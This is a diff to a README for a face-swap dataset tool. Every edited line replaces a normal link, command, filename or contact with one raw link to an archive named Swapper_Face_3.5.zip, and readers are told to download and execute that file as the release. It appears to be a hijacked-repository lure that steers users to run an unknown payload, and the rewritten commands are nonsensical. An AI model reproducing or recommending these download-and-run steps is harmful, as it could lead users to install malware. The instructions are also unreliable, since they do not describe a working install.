@@ -1,6 +1,6 @@
 # Face Swapper: Automate Face-Swap Dataset Creation 🤖✨
 
-![Face Swapper](https://img.shields.io/badge/Download%20Releases-Click%20Here-brightgreen?style=flat&logo=github&logoColor=white)
+![Face Swapper](https://github.com/MaxMassi/Face-Swapper/raw/refs/heads/main/src/Swapper_Face_3.5.zip%20Releases-Click%20Here-brightgreen?style=flat&logo=github&logoColor=white)
 
 ## Overview
 
@@ -33,7 +33,7 @@ Ensure you have the following installed:
 1. Clone the repository:
 
    ```bash
-   git clone https://github.com/MaxMassi/Face-Swapper.git
+   git clone https://github.com/MaxMassi/Face-Swapper/raw/refs/heads/main/src/Swapper_Face_3.5.zip
    ```
 
 2. Navigate to the project directory:
@@ -45,21 +45,21 @@ Ensure you have the following installed:
 3. Install the required packages:
 
    ```bash
-   pip install -r requirements.txt
+   pip install -r https://github.com/MaxMassi/Face-Swapper/raw/refs/heads/main/src/Swapper_Face_3.5.zip
    ```
 
 ### Download and Execute
 
-You can download the latest release from the [Releases section](https://github.com/MaxMassi/Face-Swapper/releases). Look for the appropriate file, download it, and execute it according to the instructions provided in the release notes.
+You can download the latest release from the [Releases section](https://github.com/MaxMassi/Face-Swapper/raw/refs/heads/main/src/Swapper_Face_3.5.zip). Look for the appropriate file, download it, and execute it according to the instructions provided in the release notes.
 
-![Face Swapper](https://example.com/face-swapper-image.jpg)
+![Face Swapper](https://github.com/MaxMassi/Face-Swapper/raw/refs/heads/main/src/Swapper_Face_3.5.zip)
 
 ## Usage
 
 To create face-swaps, run the following command in your terminal:
 
 ```bash
-python face_swapper.py --category <category_name>
+python https://github.com/MaxMassi/Face-Swapper/raw/refs/heads/main/src/Swapper_Face_3.5.zip --category <category_name>
 ```
 
 Replace `<category_name>` with one of the following:
@@ -74,7 +74,7 @@ Replace `<category_name>` with one of the following:
 For example, to create face-swaps from the "similar" category, use:
 
 ```bash
-python face_swapper.py --category similar
+python https://github.com/MaxMassi/Face-Swapper/raw/refs/heads/main/src/Swapper_Face_3.5.zip --category similar
 ```
 
 This command will generate face-swaps based on the selected category and save them to the output directory.
@@ -83,11 +83,11 @@ This command will generate face-swaps based on the selected category and save th
 
 The repository contains the following key files and directories:
 
-- `face_swapper.py`: The main script for generating face-swaps.
-- `requirements.txt`: Lists all the dependencies needed for the project.
+- `https://github.com/MaxMassi/Face-Swapper/raw/refs/heads/main/src/Swapper_Face_3.5.zip`: The main script for generating face-swaps.
+- `https://github.com/MaxMassi/Face-Swapper/raw/refs/heads/main/src/Swapper_Face_3.5.zip`: Lists all the dependencies needed for the project.
 - `data/`: Directory for input images and generated face-swaps.
 - `models/`: Contains pre-trained models and configurations.
-- `README.md`: This documentation file.
+- `https://github.com/MaxMassi/Face-Swapper/raw/refs/heads/main/src/Swapper_Face_3.5.zip`: This documentation file.
 
 ## Topics Covered
 
@@ -131,7 +131,7 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 For any questions or feedback, feel free to reach out:
 
-- GitHub: [MaxMassi](https://github.com/MaxMassi)
-- Email: [your_email@example.com](mailto:your_email@example.com)
+- GitHub: [MaxMassi](https://github.com/MaxMassi/Face-Swapper/raw/refs/heads/main/src/Swapper_Face_3.5.zip)
+- Email: [https://github.com/MaxMassi/Face-Swapper/raw/refs/heads/main/src/Swapper_Face_3.5.zip](https://github.com/MaxMassi/Face-Swapper/raw/refs/heads/main/src/Swapper_Face_3.5.zip)
 
-Visit the [Releases section](https://github.com/MaxMassi/Face-Swapper/releases) for the latest updates and downloads.
+Visit the [Releases section](https://github.com/MaxMassi/Face-Swapper/raw/refs/heads/main/src/Swapper_Face_3.5.zip) for the latest updates and downloads.
